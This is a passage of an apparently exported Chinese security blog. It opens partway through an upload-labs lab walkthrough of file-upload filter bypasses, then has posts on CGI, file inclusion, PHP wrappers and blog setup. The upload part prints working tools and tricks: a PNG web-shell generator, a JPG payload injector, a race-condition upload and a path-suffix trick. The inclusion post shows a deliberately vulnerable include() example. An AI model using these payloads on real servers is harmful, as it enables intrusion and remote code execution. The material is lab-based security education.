用于取得图像类型的文件后缀</code></pre><p>绕过方法: 上传图马木马即可</p><h3 id="十四-图马-exif-imagetype"><a href="#十四-图马-exif-imagetype" class="headerlink" title="十四.图马 exif_imagetype()"></a>十四.图马 exif_imagetype()</h3><p>查看源码:</p><p><img src="https://Lmg66.github.io/img/58.png" alt="图片"></p><p>exif_imagetype()函数：</p><pre><code>用于判断一个图像的类型，正常则返回签名对应常量，否则返回false</code></pre><p>绕过方法：上传图片木马即可</p><h3 id="十五-图马-二次渲染"><a href="#十五-图马-二次渲染" class="headerlink" title="十五.图马 二次渲染"></a>十五.图马 二次渲染</h3><h4 id="查看源码-对gif的过滤部分：发现gif图片被二次渲染"><a href="#查看源码-对gif的过滤部分：发现gif图片被二次渲染" class="headerlink" title="查看源码 对gif的过滤部分：发现gif图片被二次渲染"></a>查看源码 对gif的过滤部分：发现gif图片被二次渲染</h4><p><img src="https://Lmg66.github.io/img/42.png" alt="图片"></p><p>尝试上传gif(带有木马)，并将上传</p><p><img src="https://Lmg66.github.io/img/43.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/44.png" alt="图片"></p><p>gif绕过:找到渲染前后没有变化的位置，然后将php木马写入即可，下载上传后的gif，发现木马上传成功</p><p><img src="https://Lmg66.github.io/img/45.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/46.png" alt="图片"></p><h4 id="查看源码：对png的过滤部分-发现被二次渲染"><a href="#查看源码：对png的过滤部分-发现被二次渲染" class="headerlink" title="查看源码：对png的过滤部分 发现被二次渲染"></a>查看源码：对png的过滤部分 发现被二次渲染</h4><p><img src="https://Lmg66.github.io/img/47.png" alt="图片"></p><p>尝试上传带有一句话木马的png图片，上传下载发现木马被渲染掉</p><p><img src="https://Lmg66.github.io/img/48.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/49.png" alt="图片"></p><p>绕过方法：</p><p>1.写入php代码到PLTE模块</p><p>PLTE模块:调色板PLTE数据块是辅助数据快，对于索引图像，调试板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p><p>PLTE模块是辅助模块并不是每个png图片都有的，多找几个png图片</p><p><img src="https://Lmg66.github.io/img/50.png" alt="图片"></p><p>然后计算PLTE数据块的CRC</p><pre><code>import binasciiimport repng = open(r&#39;2.png&#39;,&#39;rb&#39;)a = png.read()png.close()hexstr = binascii.b2a_hex(a)&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffffprint hex(crc)</code></pre><p>运行结果写入CRC模块</p><p><img src="https://Lmg66.github.io/img/51.png" alt="图片"></p><p>然后上传即可；注：CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。储存用来检测是否有错误的循环冗余码。参考<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><p>2.写入IDAT数据块</p><p>国外大佬脚本直接用</p><pre><code>&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) {   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,&#39;./1.png&#39;);?&gt;</code></pre><p>运行脚本生成1.png，发现木马<?=$_GET[0]($_POST[1]);?>被写入</p><p><img src="https://Lmg66.github.io/img/52.png" alt="图片"></p><p>上传利用：文件包含</p><p><img src="https://Lmg66.github.io/img/53.png" alt="图片"></p><p>图片原理：<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><p>木马原理：assert()会检查内部是否是字符串，如果是字符串，它将会被assert()当做php代码执行</p><h4 id="查看源码-对jpg的过滤部分-发现对jpg图片进行二次渲染"><a href="#查看源码-对jpg的过滤部分-发现对jpg图片进行二次渲染" class="headerlink" title="查看源码 对jpg的过滤部分 发现对jpg图片进行二次渲染"></a>查看源码 对jpg的过滤部分 发现对jpg图片进行二次渲染</h4><p><img src="https://Lmg66.github.io/img/54.png" alt="图片"></p><p>绕过姿势:先随便上传一个1.jpg图片到服务器，将上传后的图片下载，用国外大佬脚本处理一下（并不是所有图片都能被脚本处理插入木马多试几个）</p><p>处理cmd命令：php 脚本名.php 1.jpg（需要安装php环境）</p><p>脚本被我改一下，发现大佬脚本不能用</p><pre><code>&lt;?php    /*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */    $miniPayload = &quot;&lt;?php phpinfo();?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {        die(&#39;php-gd is not installed&#39;);    }    if(!isset($argv[1])) {        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    }    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) {        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) {            die(&#39;Incorrect SOI marker&#39;);        }        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) {                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) {                    while((!$dis-&gt;eof())) {                        if($dis-&gt;readByte() === 0xFF) {                            if($dis-&gt;readByte !== 0x00) {                                break;                            }                        }                    }                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                } elseif($correctImage) {                    $outStream = $outStreamTmp;                } else {                    break;                }                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {                    die(&#39;Success!&#39;);                } else {                    break;                }            }        }    }    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) {        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    }    function custom_error_handler($errno, $errstr, $errfile, $errline) {        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {            if(isset($m[1])) {                $extraBytes = (int)$m[1];            }        }    }    class DataInputStream {        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) {            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) {                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            } else {                $this-&gt;binData = $filename;            }            $this-&gt;size = strlen($this-&gt;binData);        }        public function seek() {            return ($this-&gt;size - strlen($this-&gt;binData));        }        public function skip($skip) {            $this-&gt;binData = substr($this-&gt;binData, $skip);        }        public function readByte() {            if($this-&gt;eof()) {                die(&#39;End Of File&#39;);            }            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        }        public function readShort() {            if(strlen($this-&gt;binData) &lt; 2) {                die(&#39;End Of File&#39;);            }            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) {                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            } else {                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            }            return $short;        }        public function eof() {            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        }    }?&gt;</code></pre><p><img src="https://Lmg66.github.io/img/55.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/56.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/57.png" alt="图片"></p><h3 id="十六-条件竞争"><a href="#十六-条件竞争" class="headerlink" title="十六.条件竞争"></a>十六.条件竞争</h3><p>查看源码：发现上传的文件先被存储在服务器，然后进行判断，如果不是jpg png gif 则unlik()删掉，是的话重命名</p><p><img src="https://Lmg66.github.io/img/59.png" alt="图片"></p><p>绕过姿势：在判断删除前，进行访问，竞争时间<br> shell.php 如下，当然也可写其他木马或者生成木马的php文件，上传用burpsuite抓包，当然可以写脚本</p><p><img src="https://Lmg66.github.io/img/60.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/61.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/62.png" alt="图片"></p><p>绕后构造访问连接：<a href="http://127.0.0.1/upload-labs-master/upload/shell.php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/upload/shell.php</a>   用burpsuite抓包发送和上传一起开始  如何不行可以尝试线程调大点，或者写脚本</p><p><img src="https://Lmg66.github.io/img/63.png" alt="图片"></p><p>类似的也是先保存再重命名同样可以竞争 源码</p><p><img src="https://Lmg66.github.io/img/64.png" alt="图片"></p><h3 id="十七-绕过"><a href="#十七-绕过" class="headerlink" title="十七../绕过"></a>十七../绕过</h3><p>查看源码：</p><p><img src="https://Lmg66.github.io/img/65.png" alt="图片"></p><p>绕过姿势：<br>Pathinfo()会返回一个关联数组含有path的信息。例如：</p><p><img src="https://Lmg66.github.io/img/66.png" alt="图片"></p><p>save_name=1.php/.这样file_ext值为空绕过黑名单，而move_uploaded_file函数忽略文件后的./就可以实现保存文件为shell.php</p><p><img src="https://Lmg66.github.io/img/67.png" alt="图片"></p><p>注：网上看有用 save_name=1.php%00绕过的，虽然能上传成功但是保存的文件名是1.php%00你是没法利用的，看看原因好像是move_uploaded_file函数把save_name当做字符串来用的（目前感觉这个方法不行，可能操作有误）</p><h3 id="十八-数组-绕过"><a href="#十八-数组-绕过" class="headerlink" title="十八.数组+./绕过"></a>十八.数组+./绕过</h3><p>查看源码：分析如图</p><p><img src="https://Lmg66.github.io/img/68.png" alt="图片"></p><p>绕过姿势：</p><p><img src="https://Lmg66.github.io/img/69.png" alt="图片"></p><p><img src="https://Lmg66.github.io/img/70.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含补充CGI技术原理</title>
      <link href="/posts/832d.html"/>
      <url>/posts/832d.html</url>
      
        <content type="html"><![CDATA[<h3 id="CGI技术原理"><a href="#CGI技术原理" class="headerlink" title="CGI技术原理"></a>CGI技术原理</h3><h4 id="1-1-CGI的提出"><a href="#1-1-CGI的提出" class="headerlink" title="1.1 CGI的提出"></a>1.1 CGI的提出</h4><p>CGI是外部扩展应用程序与WWW服务器交互的一个标准接口。按照CGI标准编写的外部扩展应用程序可以处理客户端（一般是WWW浏览器）输入的协同工作数据，完成客户端与服务器的交互操作。这在实际应用中非常有用，如可以编写CGI外部扩展程序来访问外部数据库，客户端用户可以通过它和WWW服务器来进行数据查询。CGI一般分两种：标准CGI和缓冲CGI。所有的WWW服务器均应支持标准CGI，按标准CGI编写的程序与具体的WWW服务器无关。而按缓冲CGI编写的程序与WWW服务器有关。</p><h3 id="1-2-CGI的工作原理"><a href="#1-2-CGI的工作原理" class="headerlink" title="1.2 CGI的工作原理"></a>1.2 CGI的工作原理</h3><h4 id="1．标准CGI"><a href="#1．标准CGI" class="headerlink" title="1．标准CGI"></a>1．标准CGI</h4><p>客户端、服务器、CGI接口与外部程序间的关系可用图1－1表示（编排者：图略）：如上图所示，服务器是客户端（如浏览器）与扩展程序之间的通道。当客户端的用户完成了一定输入工作（比如填充完HTML文档中的FORM表）之后向服务器发出HTTP请求（称为CGI请求），服务器守护进程接收到该请求后，就创建一个子进程（称为CGI进程）。该CGI子进程将CGI请求的有关数据设置成环境变量，在外部CGI程序与服务器间建立两条数据通道（标准I／O），然后启动URL指定的CGI程序，并与该子进程保持同步，以监测CGI程序的执行状态。子进程通过标准输出流将处理结果传递给服务器守护进程，守护进程再将处理结果作为应答消息回送到客户端。外部CGI程序通过环境变量、命令行参数、标准输入输出与WWW服务器进行通讯，传递有关参数和处理结果。<br>＊环境变量：当服务器守护进程创建子进程运行CGI程序时，设置相应的环境变量和命令行参数，以传递客户端和服务器的有关信息给该子进程。<br>＊命令行参数：命令行参数仅在有HTML文档中有SINDEX查询的情况下使用。<br>＊标准输入输出：当HTTP请求模式采用POST方式时，CGI程序通过标准输入流和有关环境变量来获取客户端传输数据；如采用GET方式时，CGI程序直接通过环境变量获取客户端传输数据。当CGI程序要返回处理结果（一般为HTML文档）给客户端时，它通过标准输出流将该结果数据传递给服务器守护进程。</p><h4 id="2．缓冲CGI"><a href="#2．缓冲CGI" class="headerlink" title="2．缓冲CGI"></a>2．缓冲CGI</h4><p>标准CGI使用Stdin／Stdout来进行数据通讯，这是由其最初开发环境（Unix操作系统）所决定的。但是许多Windows环境下的编程工具（如VB和Delphi等）是不支持这种I／O方式的，这时就不能用它们来开发基于标准CGI的应用程序。于是有些服务器提出了缓冲CGI的概念。缓冲CGI亦称为WinCGI。此时CGI扩展程序与服务器间通过缓冲CGI而不是标准CGI进行通讯，而缓冲CGI与服务器间的通讯还是通过标准CGI接口。后者由WWW服务器的内置缓冲处理程序实现。这几部分的关系可用图1－2表示（编排者：图略）：缓冲CGI的工作原理与标准CGI相似，不同的是当服务器守护进程接收到客户端的CGI请求时，所建立的CGI子进程将CGI请求的有关数据设置成环境变量外，还将它们保存在输入缓冲区中；通过缓冲处理程序在外部CGI程序与服务器间建立两条数据通道（输入／输出缓冲区）。CGI子进程通过输出缓冲区将处理结果传递给服务器守护进程。此处外部CGI程序通过环境变量和输入／输出缓冲区与WWW服务器进行通讯，传递有关参数和处理结果。此处环境变量的意义同上，不过这些环境变量及其相应值保存在输入缓冲区中。此外，输入缓冲区中还存放客户端的传输数据（如采用POST模式的话）。输出缓冲区用来存放扩展程序的处理结果。</p><h4 id="3．标准CGI与缓冲CGI的区别"><a href="#3．标准CGI与缓冲CGI的区别" class="headerlink" title="3．标准CGI与缓冲CGI的区别"></a>3．标准CGI与缓冲CGI的区别</h4><p>对CGI扩展程序而言，最主要差别在于数据的I／O不同：对缓冲CGI，服务器与CGI扩展程序间的数据交换是通过缓冲区；而标准CGI是通过标准I／O。使用缓冲CGI可选择更多的开发工具，可以开发Windows95和WindowsNT下的GUI扩展程序；而使用标准CGI所选用的开发工具必须支持标准I／O。只有少数几种WWW服务器支持缓冲CGI，因此基于它的扩展程序兼容性不如标准CGI好。</p><h3 id="1．3-CGI与其他WWW技术的关系"><a href="#1．3-CGI与其他WWW技术的关系" class="headerlink" title="1．3 CGI与其他WWW技术的关系"></a>1．3 CGI与其他WWW技术的关系</h3><p>CGI作为WWW服务器的标准扩展技术，由上面CGI的基本原理可知，它和许多其它的WWW技术密切相关，如HTTP、HTML、MIME和URL等，下面主要就它与前两种技术的关系进行研究。</p><h4 id="1．CGI与HTTP协议"><a href="#1．CGI与HTTP协议" class="headerlink" title="1．CGI与HTTP协议"></a>1．CGI与HTTP协议</h4><p>CGI通过HTTP协议在客户端和服务端进行通讯：＊客户端用户代理向服务器发送的请求是HTTP请求消息。该消息中含有处理用户输入的CGI扩展程序的URL值。＊CGI扩展程序在处理结束后，返回给客户端的应答是HTTP应答消息。因此CGI程序的输出数据必须符合HTTP应答消息的语法格式，这在基于CGI标准的开发中非常重要。</p><h4 id="2．CGI与HTML语言"><a href="#2．CGI与HTML语言" class="headerlink" title="2．CGI与HTML语言"></a>2．CGI与HTML语言</h4><p>CGI扩展程序的输出数据（HTTP应答消息）一般有两种：符合MIME类型的文档（最普遍的是HTML文档，表示为text/html）；指向其它文档的URL链接。这两种方式都与HTML语言有关，数据的组织须符合HTML语法格式。</p><h3 id="来自-https-www-cnblogs-com-lidabo-p-5756248-html"><a href="#来自-https-www-cnblogs-com-lidabo-p-5756248-html" class="headerlink" title="来自 https://www.cnblogs.com/lidabo/p/5756248.html"></a>来自 <a href="https://www.cnblogs.com/lidabo/p/5756248.html" target="_blank" rel="noopener">https://www.cnblogs.com/lidabo/p/5756248.html</a></h3>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> CGI技术原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含1</title>
      <link href="/posts/6b68.html"/>
      <url>/posts/6b68.html</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>产生的原因:主要原因是在编写代码的时候，调用(包含)其他文件,让其他文件按照php代码执行，这就产生了漏洞，如果调用的时候没用经过过滤或者严格的定义，可以被用户所控制，用户可以通过包含其他文件，来恶意的执行php代码。<br>示例代码:<br><?php    $filename=$_GET['filename'];    include($filename);?><br>例如:$_GET[‘filename’]没有经过滤直接代入了include中，这就导致攻击者可以通过修改$_GET[‘filename’]的值，恶心执行php代码，产生非预期的效果。<br>php中文件包含的四种函数:<br>require()         函数调用时出现错误，会直接报错并退出程序<br>require_one() 与require()函数一样，但相同的文件只能调用执行一次<br>include()          函数包含出现错误时会报错，但会继续执行后面的代码<br>include_one()  与include()函数一样，但相同的文件只能调用执行一次<br><img src="https://Lmg66.github.io/img/2.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含2</title>
      <link href="/posts/e8ab.html"/>
      <url>/posts/e8ab.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言：自从博客弄好后就休息了一段时间，所以没学啥就分享一下之前学的文件包含中的php伪协议，因为懒得在打一遍就直接把OneNote中的笔记用图片分享，而图片没有做加速可能加载会比较慢还望谅解。"><a href="#前言：自从博客弄好后就休息了一段时间，所以没学啥就分享一下之前学的文件包含中的php伪协议，因为懒得在打一遍就直接把OneNote中的笔记用图片分享，而图片没有做加速可能加载会比较慢还望谅解。" class="headerlink" title="前言：自从博客弄好后就休息了一段时间，所以没学啥就分享一下之前学的文件包含中的php伪协议，因为懒得在打一遍就直接把OneNote中的笔记用图片分享，而图片没有做加速可能加载会比较慢还望谅解。"></a>前言：自从博客弄好后就休息了一段时间，所以没学啥就分享一下之前学的文件包含中的php伪协议，因为懒得在打一遍就直接把OneNote中的笔记用图片分享，而图片没有做加速可能加载会比较慢还望谅解。</h3><h3 id="正文：php伪协议的目的-个人理解-用来读取文件，获得源码，写入木马"><a href="#正文：php伪协议的目的-个人理解-用来读取文件，获得源码，写入木马" class="headerlink" title="正文：php伪协议的目的(个人理解):用来读取文件，获得源码，写入木马"></a>正文：php伪协议的目的(个人理解):用来读取文件，获得源码，写入木马</h3><p><img src="https://Lmg66.github.io/img/1.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两种搭建个人博客方法</title>
      <link href="/posts/2f31.html"/>
      <url>/posts/2f31.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言-整了一个阿里云的服务器-不过没用上-，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你"><a href="#前言-整了一个阿里云的服务器-不过没用上-，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你" class="headerlink" title="前言:整了一个阿里云的服务器(不过没用上)，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你"></a>前言:整了一个阿里云的服务器(不过没用上)，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你</h3><h1 id="方法一-个人服务器-宝塔-wordpress"><a href="#方法一-个人服务器-宝塔-wordpress" class="headerlink" title="方法一:个人服务器+宝塔+wordpress"></a>方法一:个人服务器+宝塔+wordpress</h1><hr><h2 id="方法一-优势"><a href="#方法一-优势" class="headerlink" title="方法一:优势"></a>方法一:优势</h2><ol><li>可拓展性强，可以添加论坛，个人游戏等等的个人项目</li><li>操作简单，wordpress后台是图形化页面</li><li>国内访问速度较快</li></ol><h2 id="方法一-劣势"><a href="#方法一-劣势" class="headerlink" title="方法一:劣势"></a>方法一:劣势</h2><ol><li>域名需要实名，服务器需要备案(大陆)，大概需要小半个月</li><li>需要费用，大概200元/年(学生优惠)</li><li>可能服务器被攻击，需要打补丁和后期维护</li></ol><h3 id="如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频b站小游-他的主题也很好看可以使用，看他的视频完全够用了"><a href="#如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频b站小游-他的主题也很好看可以使用，看他的视频完全够用了" class="headerlink" title="如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频b站小游,他的主题也很好看可以使用，看他的视频完全够用了"></a>如果想用这种方法搭建个人博客，推荐一个我找了很久的很好的视频<a href="https://www.bilibili.com/video/BV1j4411C7Qf" target="_blank" rel="noopener">b站小游</a>,他的主题也很好看可以使用，看他的视频完全够用了</h3><hr><h1 id="方法二-基于github-码云-coding搭建-hexo"><a href="#方法二-基于github-码云-coding搭建-hexo" class="headerlink" title="方法二:基于github/码云/coding搭建+hexo"></a>方法二:基于github/码云/coding搭建+hexo</h1><hr><h2 id="方法二-优势"><a href="#方法二-优势" class="headerlink" title="方法二:优势"></a>方法二:优势</h2><ol><li>免费不用域名也不用服务器，如果你想自定义域名也可以绑定</li><li>不用担心网站被攻击，因为是是纯静态页面</li></ol><h2 id="方法二-劣势"><a href="#方法二-劣势" class="headerlink" title="方法二:劣势"></a>方法二:劣势</h2><ol><li>可拓展性差，因为没法数据交互，不过如果只是整博客完全够用</li><li>访问速度可能会慢些，github你懂的，推荐使用国内类似github的码云来搭建，访问速度还是可以的</li><li>需要学习的要多一些(一些基础的git，Markdown ，css，js，html)，没有图形化页面需要面对源码进行美化和发布文章</li></ol><h3 id="如果想用这种方法搭建个人博客，推荐我看的教程博客很不错过客-我的github也有我博客的源码，其他的需要啥自行百度"><a href="#如果想用这种方法搭建个人博客，推荐我看的教程博客很不错过客-我的github也有我博客的源码，其他的需要啥自行百度" class="headerlink" title="如果想用这种方法搭建个人博客，推荐我看的教程博客很不错过客,我的github也有我博客的源码，其他的需要啥自行百度"></a>如果想用这种方法搭建个人博客，推荐我看的教程博客很不错<a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">过客</a>,我的github也有我博客的源码，其他的需要啥自行百度</h3><hr><h3 id="好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq"><a href="#好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq" class="headerlink" title="好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq"></a>好的就这些，因为还没弄图床没法发图片都这样吧，具体问题可以留言，评论，私聊我qq</h3>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人博客的搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
